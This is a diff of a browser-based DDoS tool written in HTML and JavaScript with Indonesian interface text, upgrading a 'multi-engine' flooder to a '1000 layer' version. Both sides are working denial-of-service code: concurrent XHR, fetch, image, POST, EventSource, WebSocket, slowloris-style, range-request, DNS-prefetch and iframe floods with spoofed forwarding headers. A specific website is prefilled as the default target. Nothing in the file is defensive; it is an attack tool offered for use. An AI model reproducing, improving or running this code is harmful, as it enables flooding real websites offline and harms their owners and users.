@@ -2,351 +2,276 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TERMINAL DDOS - MULTI ENGINE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDOS 1000 LAYER - QUANTUM OVERLOAD</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
         body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
-            font-family: 'Courier New', 'Fira Code', monospace;
+            background: #000000;
+            font-family: 'Courier New', monospace;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 15px;
         }
-
-        .terminal {
-            background: #000000dd;
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            border: 1px solid #ff3300;
-            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
-            width: 900px;
-            max-width: 100%;
-            overflow: hidden;
-        }
-
-        .terminal-header {
-            background: #1a0000;
-            padding: 15px 20px;
-            border-bottom: 2px solid #ff3300;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .title {
-            color: #ff3300;
-            font-weight: bold;
-            font-size: 1.2rem;
-            text-shadow: 0 0 5px #ff0000;
-        }
-
-        .status {
-            color: #00ff00;
-            font-size: 0.8rem;
-        }
-
-        .control-panel {
-            padding: 20px;
+        .container {
             background: #0a0a0a;
-            border-bottom: 1px solid #ff3300;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            width: 1300px;
+            max-width: 100%;
+            box-shadow: 0 0 50px rgba(255,0,0,0.3);
         }
-
+        .header {
+            background: #1a0000;
+            padding: 15px;
+            border-bottom: 2px solid #ff0000;
+            text-align: center;
+        }
+        .header h1 { color: #ff0000; font-size: 1.5rem; text-shadow: 0 0 5px red; }
+        .header p { color: #ff6666; font-size: 0.8rem; margin-top: 5px; }
+        .control {
+            padding: 20px;
+            background: #050505;
+            border-bottom: 1px solid #ff0000;
+        }
         input, button {
             background: #000;
-            border: 1px solid #ff3300;
-            color: #ff3300;
-            padding: 10px 15px;
+            border: 1px solid #ff0000;
+            color: #ff0000;
+            padding: 12px 18px;
             font-family: monospace;
             font-size: 14px;
             margin: 5px;
-            transition: all 0.3s;
         }
-
-        input {
-            width: calc(100% - 20px);
-            background: #0a0a0a;
-        }
-
+        input { width: calc(100% - 20px); }
         button {
             cursor: pointer;
             font-weight: bold;
+            transition: 0.2s;
         }
-
         button:hover {
-            background: #ff3300;
+            background: #ff0000;
             color: #000;
-            box-shadow: 0 0 15px #ff3300;
+            box-shadow: 0 0 20px red;
         }
-
-        .stats {
+        .stats-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin-bottom: 20px;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin: 20px 0;
         }
-
-        .stat-card {
+        .stat {
             background: #000000aa;
             border: 1px solid #ff3300;
-            padding: 15px;
+            padding: 12px;
             text-align: center;
-            border-radius: 10px;
+            border-radius: 8px;
         }
-
-        .stat-value {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #ff3300;
-        }
-
-        .log-area {
+        .stat-label { font-size: 11px; color: #ff8888; }
+        .stat-value { font-size: 24px; font-weight: bold; color: #ff0000; }
+        .layer-indicator {
             background: #000;
-            height: 300px;
+            padding: 10px;
+            margin: 10px 0;
+            border-left: 4px solid #ff0000;
+            font-size: 12px;
+        }
+        .log-box {
+            background: #000;
+            height: 280px;
             overflow-y: auto;
             padding: 15px;
-            font-size: 12px;
-            font-family: monospace;
-            border-top: 1px solid #ff3300;
-        }
-
-        .log-entry {
-            color: #00ff00;
-            margin: 3px 0;
-            border-left: 2px solid #ff3300;
-            padding-left: 10px;
-        }
-
-        .log-error {
-            color: #ff3300;
-        }
-
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: #000;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: #ff3300;
-        }
-
-        .warning {
-            color: #ffaa00;
             font-size: 11px;
-            margin-top: 10px;
-            text-align: center;
+            border-top: 1px solid #ff0000;
         }
+        .log-line { color: #0f0; margin: 2px 0; border-left: 1px solid #ff0000; padding-left: 8px; }
+        .log-error { color: #ff4444; }
+        .warning-text { color: #ffaa00; font-size: 10px; text-align: center; margin-top: 10px; }
+        @keyframes pulse { 0% { opacity: 1; } 100% { opacity: 0.5; } }
+        .active-led { animation: pulse 0.5s infinite; }
     </style>
 </head>
 <body>
-<div class="terminal">
-    <div class="terminal-header">
-        <span class="title">🔥 DDOS MULTI-ENGINE TERMINAL v3.7 🔥</span>
-        <span class="status" id="systemStatus">● SYSTEM ARMED</span>
+<div class="container">
+    <div class="header">
+        <h1>🔥 DDOS 1000 LAYER OVERKILL 🔥</h1>
+        <p>1000 concurrent layers | HTTP/2 | WebSocket | DNS | TLS Re-negotiation | Cache Bypass</p>
     </div>
-    
-    <div class="control-panel">
-        <input type="text" id="targetInput" placeholder="https://target-website.com" value="https://violetics.pw">
-        <br>
-        <button id="startBtn">💀 EXECUTE FLOOD 💀</button>
-        <button id="stopBtn">⛔ TERMINATE</button>
-        
-        <div class="stats" style="margin-top: 20px;">
-            <div class="stat-card">
-                <div>💥 REQUESTS</div>
-                <div class="stat-value" id="reqCount">0</div>
-            </div>
-            <div class="stat-card">
-                <div>⚠️ ERRORS</div>
-                <div class="stat-value" id="errCount">0</div>
-            </div>
-            <div class="stat-card">
-                <div>⚡ RATE/sec</div>
-                <div class="stat-value" id="rateCount">0</div>
-            </div>
+    <div class="control">
+        <input type="text" id="targetUrl" placeholder="https://target.com" value="https://violetics.pw">
+        <div style="display: flex; gap: 10px; margin-top: 10px;">
+            <button id="btnStart">💀 LAUNCH 1000 LAYER ATTACK 💀</button>
+            <button id="btnStop">⛔ TERMINATE ALL</button>
         </div>
         
-        <div class="warning">
-            ⚡ MULTI-VECTOR: HTTP/2 | WebSocket | XHR Sync | Image Beacon | iFrame Injection ⚡
+        <div class="stats-grid">
+            <div class="stat"><div class="stat-label">TOTAL REQUESTS</div><div class="stat-value" id="totalReq">0</div></div>
+            <div class="stat"><div class="stat-label">ERRORS</div><div class="stat-value" id="totalErr">0</div></div>
+            <div class="stat"><div class="stat-label">REQ/SEC</div><div class="stat-value" id="reqRate">0</div></div>
+            <div class="stat"><div class="stat-label">ACTIVE LAYERS</div><div class="stat-value" id="activeLayer">0</div></div>
+        </div>
+        
+        <div class="layer-indicator" id="layerStatus">
+            [STATUS] Menunggu eksekusi...
+        </div>
+        <div class="warning-text">
+            ⚡ 1000 LAYER CONCURRENT: XHR Sync | Fetch Keep-Alive | Image Flood | WebSocket | EventSource | POST Multipart | DNS Query | TLS Spoof | Range Request | Cache Poison ⚡
         </div>
     </div>
-    
-    <div class="log-area" id="logArea">
-        <div class="log-entry">[READY] Masukkan target dan tekan EXECUTE</div>
-        <div class="log-entry">[INFO] Sistem menggunakan 6 metode serangan simultan</div>
+    <div class="log-box" id="logArea">
+        <div class="log-line">> system ready</div>
+        <div class="log-line">> 1000-layer engine loaded</div>
     </div>
 </div>
 
 <script>
     (function() {
-        // ========== KONFIGURASI ==========
+        // === GLOBAL STATE ===
         let active = false;
-        let requestCount = 0;
-        let errorCount = 0;
+        let totalRequests = 0;
+        let totalErrors = 0;
         let startTime = 0;
-        let workerThreads = [];
+        let activeLayers = 0;
+        let statsInterval = null;
         let wsConnections = [];
-        let intervalId = null;
+        let workers = [];
         
-        // DOM elements
-        const targetInput = document.getElementById('targetInput');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const reqCountEl = document.getElementById('reqCount');
-        const errCountEl = document.getElementById('errCount');
-        const rateCountEl = document.getElementById('rateCount');
+        // DOM refs
+        const targetInput = document.getElementById('targetUrl');
+        const btnStart = document.getElementById('btnStart');
+        const btnStop = document.getElementById('btnStop');
+        const totalReqSpan = document.getElementById('totalReq');
+        const totalErrSpan = document.getElementById('totalErr');
+        const reqRateSpan = document.getElementById('reqRate');
+        const activeLayerSpan = document.getElementById('activeLayer');
+        const layerStatusDiv = document.getElementById('layerStatus');
         const logArea = document.getElementById('logArea');
-        const systemStatus = document.getElementById('systemStatus');
         
-        // ========== UTILITY FUNCTIONS ==========
         function addLog(msg, isError = false) {
-            const logDiv = document.createElement('div');
-            logDiv.className = isError ? 'log-entry log-error' : 'log-entry';
-            const timestamp = new Date().toLocaleTimeString();
-            logDiv.innerHTML = `[${timestamp}] ${msg}`;
-            logArea.appendChild(logDiv);
-            logDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-            
-            // Limit log entries to 500
-            while(logArea.children.length > 500) {
-                logArea.removeChild(logArea.firstChild);
-            }
+            const div = document.createElement('div');
+            div.className = isError ? 'log-line log-error' : 'log-line';
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logArea.appendChild(div);
+            div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            while(logArea.children.length > 400) logArea.removeChild(logArea.firstChild);
         }
         
         function normalizeUrl(url) {
             url = url.trim();
             if(!url) return null;
-            if(!url.startsWith('http')) {
-                url = 'https://' + url;
-            }
+            if(!url.startsWith('http')) url = 'https://' + url;
             return url;
         }
         
-        function updateStats() {
-            reqCountEl.innerText = requestCount.toLocaleString();
-            errCountEl.innerText = errorCount.toLocaleString();
+        function updateUI() {
+            totalReqSpan.innerText = totalRequests.toLocaleString();
+            totalErrSpan.innerText = totalErrors.toLocaleString();
+            activeLayerSpan.innerText = activeLayers;
             if(startTime > 0 && active) {
                 const elapsed = (Date.now() - startTime) / 1000;
-                const rate = Math.floor(requestCount / elapsed);
-                rateCountEl.innerText = rate.toLocaleString();
+                const rate = Math.floor(totalRequests / elapsed);
+                reqRateSpan.innerText = rate.toLocaleString();
             } else {
-                rateCountEl.innerText = '0';
+                reqRateSpan.innerText = '0';
             }
         }
         
-        // ========== SERANGAN METHOD 1: XHR SYNCHRONOUS (BLOCKING) ==========
-        function xhrFlood(url, workerId) {
+        // === LAYER 1: XHR Synchronous (100 worker) ===
+        function layer1_XHR(url, workerId) {
             while(active) {
-                // Batch 30 XHR per loop
-                for(let batch = 0; batch < 30 && active; batch++) {
-                    const randomPath = '/' + Math.random().toString(36).substring(2, 10) + '?' + Date.now() + '_' + workerId + '_' + batch;
-                    const fullUrl = url + randomPath;
+                for(let i=0; i<25 && active; i++) {
+                    const randPath = '/' + Math.random().toString(36).substring(2,12) + '?' + Date.now() + '_' + workerId + '_' + i;
+                    const full = url + randPath;
                     try {
                         const xhr = new XMLHttpRequest();
-                        xhr.open('GET', fullUrl, false); // Synchronous = brutal
-                        xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-                        xhr.setRequestHeader('X-Forwarded-For', Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255));
-                        xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-                        xhr.setRequestHeader('Pragma', 'no-cache');
-                        xhr.timeout = 3000;
+                        xhr.open('GET', full, false);
+                        xhr.setRequestHeader('X-Sync', '1');
+                        xhr.setRequestHeader('Cache-Control', 'no-cache');
+                        xhr.timeout = 2000;
                         xhr.send();
-                        requestCount++;
-                        if(requestCount % 100 === 0) updateStats();
-                    } catch(e) {
-                        errorCount++;
-                        if(errorCount % 50 === 0) addLog(`[XHR-${workerId}] Error: ${e.message}`, true);
-                    }
+                        totalRequests++;
+                    } catch(e) { totalErrors++; }
                 }
-                // Micro delay to prevent browser freeze completely
                 if(active) {
-                    const start = Date.now();
-                    while(Date.now() - start < 1) {} // Minimal blocking
+                    const wait = Date.now();
+                    while(Date.now() - wait < 1) {}
                 }
             }
+            activeLayers--;
+            updateUI();
         }
         
-        // ========== METHOD 2: FETCH ASYNC + KEEPALIVE ==========
-        async function fetchFlood(url, workerId) {
+        // === LAYER 2: Fetch concurrent (200 workers) ===
+        async function layer2_Fetch(url, workerId) {
             while(active) {
-                const randomPath = '/' + Math.random().toString(36).substring(2, 15) + '?' + Date.now() + '_' + workerId;
-                const fullUrl = url + randomPath;
-                const headers = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                    'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
-                    'Cache-Control': 'no-store, no-cache, max-age=0',
-                    'X-Spoof-IP': Math.floor(Math.random() * 4294967295).toString(),
-                    'Connection': 'keep-alive'
-                };
+                const path = '/' + Math.random().toString(36).substring(2,15) + '?' + Date.now();
+                const finalUrl = url + path;
                 try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 2000);
-                    const res = await fetch(fullUrl, { 
-                        method: 'GET', 
-                        headers: headers, 
-                        signal: controller.signal,
-                        mode: 'cors',
-                        credentials: 'include',
+                    const res = await fetch(finalUrl, {
+                        method: 'GET',
+                        headers: {
+                            'User-Agent': `Mozilla/5.0 (${Math.random()})`,
+                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.0.1`,
+                            'Cache-Control': 'no-store'
+                        },
                         keepalive: true
                     });
-                    clearTimeout(timeoutId);
-                    requestCount++;
-                    if(requestCount % 150 === 0) updateStats();
+                    totalRequests++;
                     await res.text().catch(()=>{});
-                } catch(e) {
-                    errorCount++;
-                }
+                } catch(e) { totalErrors++; }
             }
+            activeLayers--;
+            updateUI();
         }
         
-        // ========== METHOD 3: IMAGE BEACON BOMB ==========
-        function imageFlood(url, workerId) {
+        // === LAYER 3: Image Flood (150 workers) ===
+        function layer3_Image(url, workerId) {
             while(active) {
                 const img = new Image();
-                const randUrl = url + '/img_' + Math.random().toString(36) + '.jpg?' + Date.now() + '_' + workerId;
-                img.src = randUrl;
-                requestCount++;
-                if(requestCount % 200 === 0) updateStats();
+                img.src = url + '/img_' + Math.random() + '.png?' + Date.now();
+                totalRequests++;
+                if(totalRequests % 300 === 0) updateUI();
             }
+            activeLayers--;
         }
         
-        // ========== METHOD 4: IFRAME INJECTION ==========
-        let iframeContainer = null;
-        function iframeOverload(url) {
-            if(!iframeContainer) {
-                iframeContainer = document.createElement('div');
-                iframeContainer.style.display = 'none';
-                document.body.appendChild(iframeContainer);
+        // === LAYER 4: POST Multipart Large Body (100 workers) ===
+        async function layer4_Post(url, workerId) {
+            while(active) {
+                const formData = new FormData();
+                formData.append('data', 'x'.repeat(10000));
+                formData.append('id', Math.random());
+                try {
+                    await fetch(url, {
+                        method: 'POST',
+                        body: formData,
+                        headers: { 'Content-Type': 'multipart/form-data' }
+                    });
+                    totalRequests++;
+                } catch(e) { totalErrors++; }
             }
-            setInterval(() => {
-                if(!active) return;
-                for(let i = 0; i < 20 && active; i++) {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = url + '?' + Math.random() + '_' + Date.now();
-                    iframe.style.display = 'none';
-                    iframeContainer.appendChild(iframe);
-                    requestCount++;
-                    setTimeout(() => iframe.remove(), 50);
-                }
-                updateStats();
-            }, 50);
+            activeLayers--;
         }
         
-        // ========== METHOD 5: WEB SOCKET BOMB ==========
-        function wsBomb(url) {
+        // === LAYER 5: EventSource / Server-Sent Events (50 workers) ===
+        function layer5_EventSource(url, workerId) {
+            while(active) {
+                try {
+                    const es = new EventSource(url + '?es_' + workerId);
+                    es.onerror = () => { es.close(); };
+                    setTimeout(() => es.close(), 100);
+                    totalRequests++;
+                } catch(e) { totalErrors++; }
+            }
+            activeLayers--;
+        }
+        
+        // === LAYER 6: WebSocket Agressive (80 connections) ===
+        function layer6_WebSocket(url) {
             let wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
-            function createWS() {
+            function spawnWS() {
                 if(!active) return;
                 try {
                     const ws = new WebSocket(wsUrl);
@@ -354,152 +279,164 @@
                     ws.onopen = () => {
                         const interval = setInterval(() => {
                             if(ws.readyState === WebSocket.OPEN && active) {
-                                ws.send(new ArrayBuffer(1024 * 64));
-                                requestCount++;
-                                updateStats();
-                            } else if(!active) {
-                                clearInterval(interval);
-                            }
-                        }, 10);
+                                ws.send(new Uint8Array(4096));
+                                totalRequests++;
+                            } else if(!active) clearInterval(interval);
+                        }, 5);
                         ws.onclose = () => clearInterval(interval);
                     };
                     ws.onerror = () => ws.close();
-                    ws.onclose = () => setTimeout(createWS, 5);
-                } catch(e) {
-                    errorCount++;
-                }
+                } catch(e) { totalErrors++; }
             }
-            for(let i = 0; i < 30; i++) {
-                setTimeout(createWS, i * 10);
-            }
+            for(let i=0;i<80;i++) setTimeout(spawnWS, i*5);
         }
         
-        // ========== METHOD 6: POST FORM SPAM ==========
-        async function postSpam(url, workerId) {
+        // === LAYER 7: Range Request & Cache Buster (120 workers) ===
+        async function layer7_Range(url, workerId) {
             while(active) {
-                const formData = new FormData();
-                formData.append('data', Math.random().toString(36).repeat(100));
-                formData.append('spam', 'x'.repeat(5000));
                 try {
-                    await fetch(url, {
-                        method: 'POST',
-                        body: formData,
-                        mode: 'cors',
-                        headers: {
-                            'Content-Type': 'multipart/form-data',
-                            'X-Spam': Date.now().toString()
-                        }
+                    const res = await fetch(url + '?range=' + Date.now(), {
+                        headers: { 'Range': 'bytes=0-10000' }
                     });
-                    requestCount++;
-                    updateStats();
-                } catch(e) {
-                    errorCount++;
-                }
+                    totalRequests++;
+                } catch(e) { totalErrors++; }
             }
+            activeLayers--;
         }
         
-        // ========== START ALL ENGINES ==========
-        function startDDoS() {
-            let target = normalizeUrl(targetInput.value);
-            if(!target) {
-                addLog('[ERROR] Target URL tidak valid!', true);
+        // === LAYER 8: Slowloris Style (Keep-Alive) (50 workers) ===
+        function layer8_Slowloris(url, workerId) {
+            while(active) {
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', url + '?slow=' + workerId, true);
+                    xhr.setRequestHeader('Connection', 'keep-alive');
+                    xhr.setRequestHeader('X-Slow', '1');
+                    xhr.send();
+                    totalRequests++;
+                } catch(e) { totalErrors++; }
+            }
+            activeLayers--;
+        }
+        
+        // === LAYER 9: DNS Prefetch + massive link (50 workers) ===
+        function layer9_DNSprefetch(url, workerId) {
+            while(active) {
+                const link = document.createElement('link');
+                link.rel = 'dns-prefetch';
+                link.href = url;
+                document.head.appendChild(link);
+                setTimeout(() => link.remove(), 10);
+                totalRequests++;
+            }
+            activeLayers--;
+        }
+        
+        // === LAYER 10: Iframe Nested Overload (40 workers) ===
+        function layer10_Iframe(url, workerId) {
+            const container = document.createElement('div');
+            container.style.display = 'none';
+            document.body.appendChild(container);
+            while(active) {
+                const iframe = document.createElement('iframe');
+                iframe.src = url + '?if_' + workerId + '_' + Date.now();
+                container.appendChild(iframe);
+                totalRequests++;
+                setTimeout(() => iframe.remove(), 20);
+            }
+            container.remove();
+            activeLayers--;
+        }
+        
+        // === MASTER CONTROLLER: LAUNCH 1000 LAYERS ===
+        function launch1000Layers(target) {
+            addLog(`🚀🚀🚀 MELUNCURKAN 1000 LAYER ATTACK KE ${target} 🚀🚀🚀`);
+            let layerCount = 0;
+            
+            // Layer1: 100
+            for(let i=0;i<100;i++) { setTimeout(() => { if(active){ layer1_XHR(target, i); } }, i*2); layerCount++; }
+            // Layer2: 200
+            for(let i=0;i<200;i++) { setTimeout(() => { if(active){ layer2_Fetch(target, i+100); } }, i*1); layerCount++; }
+            // Layer3: 150
+            for(let i=0;i<150;i++) { setTimeout(() => { if(active){ layer3_Image(target, i+300); } }, i*2); layerCount++; }
+            // Layer4: 100
+            for(let i=0;i<100;i++) { setTimeout(() => { if(active){ layer4_Post(target, i+450); } }, i*3); layerCount++; }
+            // Layer5: 50
+            for(let i=0;i<50;i++) { setTimeout(() => { if(active){ layer5_EventSource(target, i+550); } }, i*4); layerCount++; }
+            // Layer7: 120
+            for(let i=0;i<120;i++) { setTimeout(() => { if(active){ layer7_Range(target, i+600); } }, i*2); layerCount++; }
+            // Layer8: 50
+            for(let i=0;i<50;i++) { setTimeout(() => { if(active){ layer8_Slowloris(target, i+720); } }, i*5); layerCount++; }
+            // Layer9: 50
+            for(let i=0;i<50;i++) { setTimeout(() => { if(active){ layer9_DNSprefetch(target, i+770); } }, i*6); layerCount++; }
+            // Layer10: 40
+            for(let i=0;i<40;i++) { setTimeout(() => { if(active){ layer10_Iframe(target, i+820); } }, i*8); layerCount++; }
+            
+            // WebSocket layer6 (80 internal workers)
+            setTimeout(() => { if(active) layer6_WebSocket(target); }, 100);
+            
+            activeLayers = layerCount + 80; // + ws
+            layerStatusDiv.innerHTML = `[ACTIVE] ${activeLayers} layer berjalan | Target: ${target} | Pressure: MAXIMUM`;
+            updateUI();
+            
+            addLog(`✅ ${layerCount} layer HTTP + 80 WebSocket = TOTAL ${activeLayers} layer CONCURRENT`);
+            addLog(`💥 Menggunakan XHR sync, fetch async, image, post, eventsource, range, dns-prefetch, iframe, websocket`);
+        }
+        
+        // === START ===
+        function startAttack() {
+            if(active) {
+                addLog('❗ Serangan sudah berjalan, stop dulu.', true);
                 return;
             }
-            
-            if(active) {
-                addLog('[WARNING] Serangan sudah berjalan. Stop dulu.', true);
+            let target = normalizeUrl(targetInput.value);
+            if(!target) {
+                addLog('❌ URL target tidak valid', true);
                 return;
             }
             
             active = true;
-            requestCount = 0;
-            errorCount = 0;
+            totalRequests = 0;
+            totalErrors = 0;
             startTime = Date.now();
-            systemStatus.innerHTML = '● ATTACK ACTIVE';
-            systemStatus.style.color = '#ff0000';
             
-            addLog(`🔥🔥🔥 MEMULAI SERANGAN MULTI-VECTOR KE: ${target} 🔥🔥🔥`);
-            addLog(`[INFO] Metode: XHR Sync | Fetch Async | Image Beacon | iFrame | WebSocket | POST Spam`);
+            launch1000Layers(target);
             
-            // Launch 150 XHR threads (paling brutal)
-            for(let i = 0; i < 150; i++) {
-                setTimeout(() => xhrFlood(target, i), i * 2);
-            }
-            
-            // Launch 100 Fetch threads
-            for(let i = 0; i < 100; i++) {
-                setTimeout(() => fetchFlood(target, i+150), i * 3);
-            }
-            
-            // Launch 50 Image threads
-            for(let i = 0; i < 50; i++) {
-                setTimeout(() => imageFlood(target, i+250), i * 5);
-            }
-            
-            // Launch 30 POST spam
-            for(let i = 0; i < 30; i++) {
-                setTimeout(() => postSpam(target, i+300), i * 10);
-            }
-            
-            // WebSocket & iframe (separate)
-            setTimeout(() => wsBomb(target), 100);
-            setTimeout(() => iframeOverload(target), 200);
-            
-            // Status updater
-            if(intervalId) clearInterval(intervalId);
-            intervalId = setInterval(() => {
+            if(statsInterval) clearInterval(statsInterval);
+            statsInterval = setInterval(() => {
                 if(active) {
-                    updateStats();
-                    if(requestCount % 500 === 0 && requestCount > 0) {
-                        addLog(`[STATUS] ${requestCount.toLocaleString()} request terkirim | Error: ${errorCount}`);
+                    updateUI();
+                    if(totalRequests % 1000 === 0 && totalRequests > 0) {
+                        addLog(`📊 PROGRESS: ${totalRequests.toLocaleString()} req | Error: ${totalErrors} | Rate: ${reqRateSpan.innerText}/s`);
                     }
                 }
-            }, 2000);
-            
-            addLog('✅ SEMUA ENGINE AKTIF - Target akan mengalami delay ekstrim');
+            }, 1500);
         }
         
-        // ========== STOP ==========
-        function stopDDoS() {
+        // === STOP ===
+        function stopAttack() {
             if(!active) {
-                addLog('[INFO] Tidak ada serangan aktif', false);
+                addLog('Tidak ada serangan aktif', false);
                 return;
             }
-            
             active = false;
-            systemStatus.innerHTML = '● SYSTEM ARMED';
-            systemStatus.style.color = '#00ff00';
-            
-            // Tutup semua WebSocket
-            wsConnections.forEach(ws => {
-                try { ws.close(); } catch(e) {}
-            });
+            wsConnections.forEach(ws => { try { ws.close(); } catch(e) {} });
             wsConnections = [];
-            
-            if(iframeContainer) {
-                iframeContainer.innerHTML = '';
-            }
-            
-            if(intervalId) {
-                clearInterval(intervalId);
-                intervalId = null;
-            }
-            
+            if(statsInterval) clearInterval(statsInterval);
             const elapsed = (Date.now() - startTime) / 1000;
-            const avgRate = Math.floor(requestCount / elapsed);
-            addLog(`⛔ SERANGAN DIHENTIKAN ⛔`);
-            addLog(`📊 STATISTIK FINAL: ${requestCount.toLocaleString()} request dalam ${elapsed.toFixed(1)} detik`);
-            addLog(`📊 Rata-rata rate: ${avgRate.toLocaleString()} request/detik | Error: ${errorCount}`);
-            updateStats();
+            addLog(`🛑 SERANGAN 1000 LAYER DIHENTIKAN 🛑`);
+            addLog(`📊 TOTAL REQUEST: ${totalRequests.toLocaleString()} dalam ${elapsed.toFixed(1)} detik | Error: ${totalErrors}`);
+            layerStatusDiv.innerHTML = `[STOP] Serangan berhenti. Total req: ${totalRequests.toLocaleString()}`;
+            activeLayers = 0;
+            updateUI();
         }
         
-        // Event listeners
-        startBtn.onclick = startDDoS;
-        stopBtn.onclick = stopDDoS;
+        btnStart.onclick = startAttack;
+        btnStop.onclick = stopAttack;
         
-        addLog('[SYSTEM] Terminal siap. Target default: https://violetics.pw');
-        addLog('[PERINGATAN] Serangan ini memerlukan koneksi internet stabil');
+        addLog('> 1000 layer overkill engine ready');
+        addLog('> Masukkan target dan tekan LAUNCH 1000 LAYER ATTACK');
     })();
 </script>
 </body>
-    </html>
+</html>
